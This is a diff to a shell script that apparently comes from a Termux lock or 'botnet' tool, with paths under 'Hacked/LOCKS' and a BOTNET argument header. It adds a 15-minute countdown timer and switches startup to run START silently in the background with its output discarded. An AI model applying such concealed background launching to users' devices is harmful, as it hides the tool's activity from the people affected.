@@ -1948,7 +1948,45 @@ Lock(){
 
 				elif [[ $WT == "3" ]];then
 
-					# Show Time
+					# Create or open the text file to store the countdown time
+					file_name="Tii.txt"
+
+					# Function to display the countdown timer
+					display_countdown() {
+					  printf "\033[2J\033[1;1H"  # Clear the screen
+					  printf "\033[1;1H\033[1;1H\033[92m"
+					  printf "Countdown Timer: %02d:%02d\n" $((countdown_time/60)) $((countdown_time%60))
+					  printf "\033[0m"
+					}
+
+					# Check if the countdown time file exists
+					if [ -f "$file_name" ]; then
+					  # Read the last line of the file to get the remaining countdown time
+					  countdown_time=$(tail -n 1 "$file_name")
+					else
+					  # Set the countdown time in seconds (15 minutes)
+					  countdown_time=900
+					fi
+
+					# Loop until the countdown time reaches 0
+					while [ $countdown_time -gt 0 ]; do
+					  # Write the current countdown time to the file
+					  echo $countdown_time >> "$file_name"
+
+					  # Display the countdown timer
+					  display_countdown
+
+					  # Decrement the countdown time by 1 second
+					  countdown_time=$((countdown_time-1))
+
+					  # Wait for 1 second
+					  sleep 1
+					done
+
+					# Remove all but the last line from the file
+					tail -n 1 "$file_name" > temp_file && mv temp_file "$file_name"
+
+					echo "Countdown timer finished!"
 
 				else
 
@@ -2232,9 +2270,9 @@ done
 	rm $PREFIX/etc/Hacked/LOCKS/server_lock_file
 
 }
-SSTstart
-#START &>> /dev/null &
-SSTstart
+#SSTstart
+START &>> /dev/null &
+#SSTstart
 #-----------------BOTNET----------------#
 #  2 = IPaddres or Host
 #  3 = Port
